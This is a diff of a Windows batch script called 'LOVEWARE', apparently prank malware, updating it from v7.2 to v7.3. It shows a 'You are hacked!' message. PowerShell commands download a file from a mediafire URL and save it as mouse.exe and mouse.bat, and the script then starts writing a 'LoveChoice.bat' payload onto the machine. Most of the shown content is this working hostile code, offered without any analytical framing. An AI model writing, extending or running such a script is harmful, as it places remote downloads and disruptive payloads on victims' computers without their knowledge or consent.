@@ -1,6 +1,6 @@
 @echo off
 
-:: LOVEWARE v7.2
+:: LOVEWARE v7.3
 ::
 :: YOU CAN DELETE THIS 
 :: |  |  |  |  |  |  |
@@ -308,14 +308,15 @@ msg * "You are hacked!"
 goto run3
 goto haha
 
-:: Make the final payload "LoveChoice"
-
 :run3
 
-:: Create macro document that will move the mouse pointer.
+:: Download Mouse mover by Npocmaka so we can have some fun with the cursor. Npocmaka's repository:
+:: https://github.com/npocmaka/batch.scripts
 
 powershell -Command "(New-Object Net.WebClient).DownloadFile('http://www.mediafire.com/file/xycm8d9wqrm5rsv/mouse.bat/file', 'mouse.exe')"
 powershell -Command "Invoke-WebRequest http://www.mediafire.com/file/xycm8d9wqrm5rsv/mouse.bat/file -OutFile mouse.bat"
+
+:: Create the final payload "LoveChoice"
 
 echo @echo off>LoveChoice.bat
 echo color 57>>LoveChoice.bat
